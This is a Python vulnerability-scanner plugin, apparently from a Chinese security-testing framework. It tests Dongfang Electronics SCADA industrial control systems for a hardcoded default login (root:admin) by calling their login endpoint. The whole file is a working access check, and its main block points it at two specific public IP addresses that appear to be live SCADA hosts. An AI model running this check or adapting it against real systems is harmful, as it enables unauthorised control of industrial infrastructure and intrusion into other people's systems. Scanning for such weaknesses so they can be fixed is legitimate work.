#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 东方电子SCADA通用系统默认密码
author: yichin
refer: 
    http://www.wooyun.org/bugs/wooyun-2010-0131500
    http://www.wooyun.org/bugs/wooyun-2010-0131719
description:
    工控,
    密码硬编码在setting.inc.php中,也是没谁了
'''
import urlparse
def assign(service, arg):
    if service == 'dfe_scada':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    url = arg + 'modules/authen/server/login.php?userName=root&userPwd=admin&moduleId=1&loginMode=byUser'
    code, head, res, err, _ = curl.curl2(url)
    if (code == 200) and ('success' == res):
        security_hole("weak password:"+ url +" {root:admin}")
if __name__ == '__main__':
    from dummy import *
    audit(assign('dfe_scada', 'http://124.129.7.215/')[1])
    audit(assign('dfe_scada', 'http://221.214.179.228:5000/')[1])